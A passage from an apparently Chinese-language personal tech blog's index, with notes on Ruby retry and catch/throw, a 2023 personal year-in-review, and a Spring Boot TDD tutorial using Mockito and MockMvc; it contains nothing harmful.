<li><p>永远不要无条件retry，因为是隐式循环，最好通过计数器保证无法永远循环</p>
</li>
<li><p>retry时记录异常信息，如果retry一直无法解决问题，应该追根溯源</p>
</li>
<li><p>当使用retry之前使用延时时，需要考虑增加延时避免加剧问题</p>
<h3 id="第二十七条：throw比raise更适合用来跳出作用域"><a href="#第二十七条：throw比raise更适合用来跳出作用域" class="headerlink" title="第二十七条：throw比raise更适合用来跳出作用域"></a>第二十七条：throw比raise更适合用来跳出作用域</h3><p>我们知道可以通过异常来跳出程序栈，并在大部分适我们使用异常来控制程序流。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">loop <span class="token keyword">do</span> 
  answer <span class="token operator">=</span> ui<span class="token punctuation">.</span>prompt<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"command: "</span></span><span class="token punctuation">)</span>
  <span class="token keyword">raise</span><span class="token punctuation">(</span>StopIteration<span class="token punctuation">)</span> <span class="token keyword">if</span> answer <span class="token operator">==</span> <span class="token string-literal"><span class="token string">"quit"</span></span>
  <span class="token comment"># ...</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Ruby中的<code>break</code>只能退出一层循环</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">out_arr <span class="token operator">=</span> <span class="token string-literal"><span class="token string">%w(1 2 3 4 5)</span></span>
in_arr <span class="token operator">=</span><span class="token string-literal"><span class="token string">%w(a b c d e)</span></span>

out_arr<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>num<span class="token operator">|</span>
  p <span class="token string-literal"><span class="token string">"外部循环：</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">num</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
  in_arr<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>char<span class="token operator">|</span>
    p <span class="token string-literal"><span class="token string">"内部循环：</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">char</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
    <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token string-literal"><span class="token string">"c"</span></span>
      <span class="token keyword">break</span>  <span class="token comment"># 这里只能退出当前循环，而不退出out_arr的循环</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
  p <span class="token string-literal"><span class="token string">"----"</span></span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>现在有一个需求要把第一个匹配的字符和数字返回，有很多实现方式：</p>
</li>
<li><p>使用return（不行）</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">out_arr <span class="token operator">=</span> <span class="token string-literal"><span class="token string">%w(1 2 3 4 5)</span></span>
in_arr <span class="token operator">=</span><span class="token string-literal"><span class="token string">%w(a b c d e)</span></span>

first_num <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
first_char <span class="token operator">=</span> <span class="token string-literal"><span class="token string">''</span></span>
out_arr<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>num<span class="token operator">|</span>
  p <span class="token string-literal"><span class="token string">"外部循环：</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">num</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
  in_arr<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>char<span class="token operator">|</span>
    p <span class="token string-literal"><span class="token string">"内部循环：</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">char</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
    <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token string-literal"><span class="token string">"c"</span></span>
      first_char <span class="token operator">=</span> char
      first_num <span class="token operator">=</span> num
      <span class="token keyword">return</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
  p <span class="token string-literal"><span class="token string">"----"</span></span>
<span class="token keyword">end</span>

p <span class="token string-literal"><span class="token string">"num: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">first_num</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> char: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">first_char</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>  <span class="token comment"># 这里实际不会执行，return直接将整个函数返回了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>使用break（不行）只结束一层</p>
</li>
<li><p>使用catch 和 throw（可行），这里如果之前用过Java的人可能看的奇怪</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">out_arr <span class="token operator">=</span> <span class="token string-literal"><span class="token string">%w(1 2 3 4 5)</span></span>
in_arr <span class="token operator">=</span> <span class="token string-literal"><span class="token string">%w(a b c d e)</span></span>

match <span class="token operator">=</span> catch<span class="token punctuation">(</span><span class="token symbol">:jump</span><span class="token punctuation">)</span> <span class="token keyword">do</span>
  out_arr<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>num<span class="token operator">|</span>
    p <span class="token string-literal"><span class="token string">"外部循环：</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">num</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
    in_arr<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>char<span class="token operator">|</span>
      p <span class="token string-literal"><span class="token string">"内部循环：</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">char</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
      <span class="token keyword">if</span> char <span class="token operator">==</span> <span class="token string-literal"><span class="token string">"c"</span></span>
        <span class="token keyword">throw</span><span class="token punctuation">(</span><span class="token symbol">:jump</span><span class="token punctuation">,</span><span class="token punctuation">[</span>char<span class="token punctuation">,</span>num<span class="token punctuation">]</span><span class="token punctuation">)</span>
      <span class="token keyword">end</span>
    <span class="token keyword">end</span>
    p <span class="token string-literal"><span class="token string">"----"</span></span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

p match<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用catch关键字在对应的代码块中加上标签，并用throw跳到标签标记的代码<br>catch使用符号：jump作为代码块的标记，如果这个代码块中使用throw，并指定抛出异常到：jump，整个代码块都会停止，传递给throw的第二个参数作为返回值，如果没有传递，则返回nil。如果一直没有throw，则返回块儿的执行结果，这种情况标记是必须要传的，如果没有标记匹配的catch，程序将到更上层的栈中找对应的catch，如果一直没有，则抛出NameError异常</p>
<blockquote>
<p>要点回顾：</p>
</blockquote>
</li>
<li><p>在复杂的流程控制中，可以考虑使用throw和raise，这种方式一个额外的好处是可以吧一个对象传递到上层调用栈并作为catch的最终返回值。</p>
</li>
<li><p>尽量用简单的方法控制程序结果，可以通过方法调用和return重写catch和throw。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Ruby</category>
      </categories>
  </entry>
  <entry>
    <title>2023年度总结</title>
    <url>//post/%E4%B8%AA%E4%BA%BA%E7%BB%8F%E5%8E%86/2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h1 id="2023年度总结"><a href="#2023年度总结" class="headerlink" title="2023年度总结"></a>2023年度总结</h1><h2 id="成长"><a href="#成长" class="headerlink" title="成长"></a>成长</h2><p>二月份入职后，整个生活节奏快了很多，最初是先熟悉公司的系统框架，然后是梳理公司的业务流程，封装一些第三方的接口，后来领导看我熟练后，开始将一些简单的新业务让我来设计去做，我觉得这也算是小型公司锻炼人的一点，因为什么都要做，人员就那么几个，只要自己能力够，很快就能接触核心业务，而业务范围并不会太广。</p>
<p>这期间当然也犯了很多错误，不论是写新的业务还是维护老的代码，感谢领导和老板对我的包容，也因此让我对代码产生敬畏心，有一个好的代码规范十分重要，这体现在各个角落中：命名约定，条件判断，异常处理，代码组织方式上。这是我们在学习时最基本的课程，却也是工作中最重要的一部分，当维护一个有八百行的函数时，改哪里都是心惊肉跳的，每次上线都在心中默默祈祷千万别出问题。</p>
<p>今年没有花太多时间去学那些高大上的技术，因为完全用不到，也越发感受到不要过早将事情复杂化。主要精力还是集中在编写好的代码上，直到现在我才渐渐有意识的使用面向对象思想，其中两点让我印象深刻：<strong>异常处理,职责划分</strong>。</p>
<p>比如在看代码时，我们都不希望行数过多，因为这代表代码的职责也就越多，往往希望一个函数只做一件事。当函数在做处理并需要返回一个结果时，坏味道就是返回null值或者一个异常值，而这就导致函数的调用方不得不做条件判断，看情况是否正常，渐渐的代码相互纠缠，越来越长，越来越难以维护。而如果能用好异常，则能减少大量的If语句，将业务处理与异常处理分离，让后期维护人员一目了然代码的流程，并可能出现哪些问题。</p>
<p>而提到的职责划分，就是指面向对象中的封装，比如从数据库中取出一个订单记录，我想知道这个订单能不能送积分，这个行为应该归属于对象本身，而不是在外部做各种判断。这使反复的代码进一步复用。这些知识很早就学习了，但只有实践后，到现在我才慢慢明白其中的含义。</p>
<p>有一天我成功的重构了一段又长又臭的代码，转为整洁，清晰的代码。内心的喜悦现在仍能记住。就好像把房间的东西各就各位，并进行合理的分类。</p>
<h2 id="健康"><a href="#健康" class="headerlink" title="健康"></a>健康</h2><p>感谢自己一年来大部分时间仍坚持健身，健身并不只是撸铁。更重要的是良好的饮食和休息。很重要的一点：当你不舒服时，就去休息，不要去让你的身体承担更多的压力。这可能会让你的状态更差，也会让你训练时感到沮丧。</p>
<p>今年家里人得了一个胆囊炎，万幸的是只需要做一个小手术。但仅仅是这么一个小手术，也让人充满无力感，由于手术需要家人照顾，我和我姐相继请假照看，疫情期间时由于家里人都中招了，不得不请护工照看。等手术后，身体里还有麻药，病人是没法动的，我们需要负责帮助上厕所，擦洗身体，喂饭等等，这些都是小问题，但手术造成的疼痛，和身体无法自理是更为痛苦的。每天医院都是爆满的，各种病人从身边经过，在过道，在电梯。这其中很多都是和你我一样的青年。而这也让我更真切的感受到身体的重要性，没有一个好身体，挣再多钱也没用。一个病进去，连检查带治疗可能就是几个月的工资，而这还会让爱你的人陪着担心，最终也是自己受罪。</p>
<h2 id="视野"><a href="#视野" class="headerlink" title="视野"></a>视野</h2><p>今年博客写了13篇技术笔记和翻译了一个Rails教程，写下的文字表达了一个人的所思所想，可以写身边发生的事情，也可以写自己学习后的笔记感想，它让脑海中漂浮的东西具体化。有时对于某个点，我们以为自己想明白了，但当写的时候才发现哪哪都是漏洞，自己都无法给自己解释清楚。所以会带着问题去寻找答案，进一步的理解它。</p>
<p>有自己的博客超级重要！！！它直观的代表着你与他人的不同，在找工作时就很有用，而有时也会有意想不到事儿发生。今年在我翻译完教程后，有一个大佬看到我的文章，鼓励我加油。八月份时参加了在上海开展的RubyChina大会上，并在那里我们认识了新朋友和许多有趣的公司。</p>
<p>这次经历让我对我的职业规划有了新的想法，以前想的就是国内这几个大厂，但这次出去转了一趟才发现整个行业干什么的都有，而且待遇很多相当不错😁，出去多看看，就能发现机会还是很多的。希望自己能继续加油，做自己为之兴奋和自豪的工作，也希望工作生活相互平衡。</p>
<hr>
<p>题外话：涨薪</p>
<p>之前和Y总聊了一下，看了B站上：<code>产品老曾</code>的视频，觉得讲的相当有道理，推荐：</p>
<ul>
<li><a href="https://www.bilibili.com/video/BV1RG411M7RK/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&vd_source=0a64aa946b64cdeca6c32ae21dc17f40">裁员潮下，该不该提升职加薪？</a></li>
<li><a href="https://www.bilibili.com/video/BV1nj411G7pZ/?spm_id_from=333.1007.top_right_bar_window_default_collection.content.click&vd_source=0a64aa946b64cdeca6c32ae21dc17f40">想让老板加工资？这个绝招我屡试不爽!</a></li>
</ul>
<p>总结下来就是：</p>
<ul>
<li>自己心里掂量自己的分量，如果自己本身就不行，讲再多也没用，要是外面有人已经给offer了，你还会慌吗</li>
<li>利益是自己主动争取的，你不提老板会想主动增加成本吗？</li>
<li>薪资是公司的固定成本，和项目奖金不同，所以要证明给你涨薪是对公司有好吃的，而不是说我为公司干了多久，我缺钱之类的</li>
</ul>
<p>可以看看上面两个视频，然后结合自己情况，调整自己的策略。</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol>
<li>感觉注意力不集中了，玩手机玩的。</li>
<li>一段时间觉得自己什么都该学，但学了一阵子发现，焦虑仍在，但啥也没学好</li>
<li>自己对时间管理不足</li>
<li>自己对财务管理不足</li>
<li>代码测试不完备，做什么都不放心</li>
</ol>
<p>希望新的一年能一步步将这些问题解决，最迫在眉睫的就是刷视频问题，严重浪费时间，晚上睡觉罪恶感满满。</p>
<p>学习焦虑问题在于我没有清晰的认识到哪些东西重要，哪些东西不重要。</p>
<p>时间管理是在工作效率上低下，将尝试番茄工作法来试着解决。</p>
<p>财务管理是因为到年底了，因为要省钱了。已经开始每天记账。</p>
<p>代码测试问题，那就完善嘛。</p>
<hr>
<p>希望新的一年里，能找到自己的节奏，脚踏实地，享受生活。</p>
]]></content>
  </entry>
  <entry>
    <title>TDD In SpringBoot</title>
    <url>//post/%E6%B5%8B%E8%AF%95/TDD%20For%20SpringBoot.html</url>
    <content><![CDATA[<blockquote>
<p>参考资料：</p>
</blockquote>
<ol>
<li><a href="%5Bhttps://medium.com/@sheikarbaz5/spring-boot-with-tdd-test-driven-development-part-i-be1b90da51e%5D(https://medium.com/@sheikarbaz5/spring-boot-with-tdd-test-driven-development-part-i-be1b90da51e)">文章讲解TDD</a></li>
<li><a href="%5Bhttps://www.youtube.com/watch?v=jqwZthuBmZY&t=4s%5D(https://www.youtube.com/watch?v=jqwZthuBmZY&t=4s)">视频讲解TDD</a></li>
<li><a href="https://ruby-china.org/topics/40653">测试驱动开发在项目中的实践</a></li>
<li><a href="%5Bhttps://ruby-china.org/topics/43323%5D(https://ruby-china.org/topics/43323)">TDD的概述</a><h2 id="代码示例说明"><a href="#代码示例说明" class="headerlink" title="代码示例说明"></a>代码示例说明</h2>这里我根据<a href="%5Bhttps://github.com/teddysmithdev/pokemon-review-springboot%5D(https://github.com/teddysmithdev/pokemon-review-springboot)">github</a>的代码，进行简要的说明和讲解，最后我们会自己来写一遍测试。<br />从接口层开始编写测试，从上至下，从接口到数据访问的顺序编写测试<h3 id="Controller层测试"><a href="#Controller层测试" class="headerlink" title="Controller层测试"></a>Controller层测试</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@WebMvcTest</span><span class="token punctuation">(</span>controllers <span class="token operator">=</span> <span class="token class-name">PokemonController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@AutoConfigureMockMvc</span><span class="token punctuation">(</span>addFilters <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ExtendWith</span><span class="token punctuation">(</span><span class="token class-name">MockitoExtension</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PokemonControllerTests</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">MockMvc</span> mockMvc<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@MockBean</span>
    <span class="token keyword">private</span> <span class="token class-name">PokemonService</span> pokemonService<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">ObjectMapper</span> objectMapper<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<ul>
<li><strong>mockMvc</strong>：用来模拟HTTP请求</li>
<li><strong>objectMapper</strong>：将对象转为JSON字符串</li>
<li><strong>pokemonService</strong>：PokemonController所依赖的Service对象，这里我们为了隔离外界的影响，将依赖的Service进行mock化，所以加上注解：<code>MockBean</code>，那这个对象的所有方法调用，就可以我们来控制执行。<blockquote>
<p>@Mock  和 @MockBean 的区别？</p>
</blockquote>
</li>
</ul>
<p><strong>@Mock</strong>：</p>
<ul>
<li>@Mock 是 Mockito 库提供的注解，它允许你在测试类中声明一个mock对象。</li>
<li>使用 @Mock 注解的字段将在初始化测试类时被自动替换为mock对象，但这需要配合特定的运行器（如MockitoJUnitRunner.class）或手动调用 MockitoAnnotations.openMocks(this) 来初始化这些mock对象。</li>
<li>@Mock 创建的mock对象并不会自动添加到Spring应用上下文（ApplicationContext）中。</li>
</ul>
<p><strong>@MockBean</strong>：</p>
<ul>
<li>@MockBean 是 Spring Boot Test 框架提供的注解，它同样可以创建mock对象，但它是在Spring Boot集成测试环境下使用的。</li>
<li>当你在一个使用了 @SpringBootTest 的测试类中使用 @MockBean 时，它不仅会创建指定类型的mock对象，而且会将这个mock对象作为bean注入到当前的Spring应用上下文中。</li>
<li>这意味着所有通过Spring容器依赖注入的方式来获取这个bean的地方，在测试期间都会得到这个mock对象，而不是实际的实现类。</li>
</ul>
<p>从测试的角度就能看到，如果一个Controller依赖大量的Service对象，就需要进行大量的MockBean。测试的复杂性也就不断上升</p>
<blockquote>
<p>单元测试这里遵守一种默认的规则(AAA模式)：</p>
</blockquote>
<ol>
<li>Arrange：做一些准备工作，比如新建对象，模拟对象行为</li>
<li>Act：进行我们要执行的操作</li>
<li>Assert：断言，看返回结果是否符合我们的预期</li>
</ol>
<p>我们看一个示例：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span>
<span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">PokemonController_CreatePokemon_ReturnCreated</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
			<span class="token function">given</span><span class="token punctuation">(</span>pokemonService<span class="token punctuation">.</span><span class="token function">createPokemon</span><span class="token punctuation">(</span><span class="token class-name">ArgumentMatchers</span><span class="token punctuation">.</span><span class="token function">any</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">willAnswer</span><span class="token punctuation">(</span><span class="token punctuation">(</span>invocation <span class="token operator">-></span> invocation<span class="token punctuation">.</span><span class="token function">getArgument</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token class-name">ResultActions</span> response <span class="token operator">=</span> mockMvc<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/api/pokemon/create"</span><span class="token punctuation">)</span>
                                         <span class="token punctuation">.</span><span class="token function">contentType</span><span class="token punctuation">(</span><span class="token class-name">MediaType</span><span class="token punctuation">.</span><span class="token constant">APPLICATION_JSON</span><span class="token punctuation">)</span>
                                         <span class="token punctuation">.</span><span class="token function">content</span><span class="token punctuation">(</span>objectMapper<span class="token punctuation">.</span><span class="token function">writeValueAsString</span><span class="token punctuation">(</span>pokemonDto<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			response<span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token class-name">MockMvcResultMatchers</span><span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isCreated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
				<span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token class-name">MockMvcResultMatchers</span><span class="token punctuation">.</span><span class="token function">jsonPath</span><span class="token punctuation">(</span><span class="token string">"$.name"</span><span class="token punctuation">,</span> <span class="token class-name">CoreMatchers</span><span class="token punctuation">.</span><span class="token function">is</span><span class="token punctuation">(</span>pokemonDto<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
				<span class="token punctuation">.</span><span class="token function">andExpect</span><span class="token punctuation">(</span><span class="token class-name">MockMvcResultMatchers</span><span class="token punctuation">.</span><span class="token function">jsonPath</span><span class="token punctuation">(</span><span class="token string">"$.type"</span><span class="token punctuation">,</span> <span class="token class-name">CoreMatchers</span><span class="token punctuation">.</span><span class="token function">is</span><span class="token punctuation">(</span>pokemonDto<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> 上面的代码通过插入空白行，来区分不同的行为，严格遵守：Arrange，Act，Assert的格式。并且可以发现，通过Mockito将Service对象的行为进行预设，这样就能单纯的测试Controller对象的功能了。</p>
<h3 id="Service层测试"><a href="#Service层测试" class="headerlink" title="Service层测试"></a>Service层测试</h3><p>Service层一般依赖于Mapper层(Repository)，所以我们mock Mapper对象，就不需要真的进行数据库交互，并模拟真实的返回结果，便于单纯测试Service对象中的业务逻辑。    </p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@ExtendWith</span><span class="token punctuation">(</span><span class="token class-name">MockitoExtension</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PokemonServiceTests</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@Mock</span>
    <span class="token keyword">private</span> <span class="token class-name">PokemonRepository</span> pokemonRepository<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@InjectMocks</span>
    <span class="token keyword">private</span> <span class="token class-name">PokemonServiceImpl</span> pokemonService<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> 可以看到这里的Service中没有引入：<code>SpringBootTest</code>之类的，因为这部分是纯业务逻辑。数据库访问，或者第三方接口访问我们都可以通过Mock来控制，让测试速度更快，测试更精确。<br /><code>@InjectMocks</code>表示Service对象内需要注入依赖，我们将Mock的对象注入进去，方便控制。<br />我们看一个例子：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">PokemonService_CreatePokemon_ReturnsPokemonDto</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Pokemon</span> pokemon <span class="token operator">=</span> <span class="token class-name">Pokemon</span><span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string">"pikachu"</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"electric"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">PokemonDto</span> pokemonDto <span class="token operator">=</span> <span class="token class-name">PokemonDto</span><span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string">"pickachu"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"electric"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">when</span><span class="token punctuation">(</span>pokemonRepository<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token class-name">Mockito</span><span class="token punctuation">.</span><span class="token function">any</span><span class="token punctuation">(</span><span class="token class-name">Pokemon</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">thenReturn</span><span class="token punctuation">(</span>pokemon<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">PokemonDto</span> savedPokemon <span class="token operator">=</span> pokemonService<span class="token punctuation">.</span><span class="token function">createPokemon</span><span class="token punctuation">(</span>pokemonDto<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">Assertions</span><span class="token punctuation">.</span><span class="token function">assertThat</span><span class="token punctuation">(</span>savedPokemon<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isNotNull</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p> 可以看到这里也遵守了：Arrange，Act，Assert 层级关系。将数据库的交互全部控制住。</p>
<h3 id="Mapper层测试"><a href="#Mapper层测试" class="headerlink" title="Mapper层测试"></a>Mapper层测试</h3><p>Mapper层就是专门和数据库打交道的，我们必须了解执行的SQL能否正常运行，并符合预期，所以这里我们就需要利用真实的Mapper对象去执行操作了。但是需要注意两点：</p>
<ol>
<li>让数据库操作尽可能快</li>
<li>测试的独立性，每次测试都不能影响其他测试，比如第一条测试中插入的数据，必须清除，以防止影响第二个测试的进行</li>
</ol>
<p>代码示例：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@DataJpaTest</span>
<span class="token annotation punctuation">@AutoConfigureTestDatabase</span><span class="token punctuation">(</span>connection <span class="token operator">=</span> <span class="token class-name">EmbeddedDatabaseConnection</span><span class="token punctuation">.</span><span class="token constant">H2</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PokemonRepositoryTests</span> <span class="token punctuation">&#123;</span>

    <span class="token annotation punctuation">@Autowired</span>
    <span class="token keyword">private</span> <span class="token class-name">PokemonRepository</span> pokemonRepository<span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>@DataJpaTest：这个注解主要用于简化和优化与数据库相关的集成测试，特别是针对 Spring Data JPA 存储库。</li>
<li>@AutoConfigureTestDatabase：它会配置一个嵌入式的内存数据库（如H2），而不是连接到实际生产环境中的数据库。这使得测试更快、更独立且不会影响到生产数据。</li>
<li>在使用 @DataJpaTest 进行测试时，每个测试方法都在一个新的、与外界隔离的事务中执行。当测试方法执行完毕后，无论该方法内部对数据库进行了何种操作，Spring都会自动回滚这个事务，这样就保证了每次测试结束后数据库状态都能恢复到初始状态，不会影响后续测试。</li>
</ul>
<p>这也就解决了我们上面提到的注意事项。我们代码示例一下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">PokemonRepository_SaveAll_ReturnSavedPokemon</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token comment">//Arrange</span>
    <span class="token class-name">Pokemon</span> pokemon <span class="token operator">=</span> <span class="token class-name">Pokemon</span><span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string">"pikachu"</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"electric"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//Act</span>
    <span class="token class-name">Pokemon</span> savedPokemon <span class="token operator">=</span> pokemonRepository<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span>pokemon<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//Assert</span>
    <span class="token class-name">Assertions</span><span class="token punctuation">.</span><span class="token function">assertThat</span><span class="token punctuation">(</span>savedPokemon<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isNotNull</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
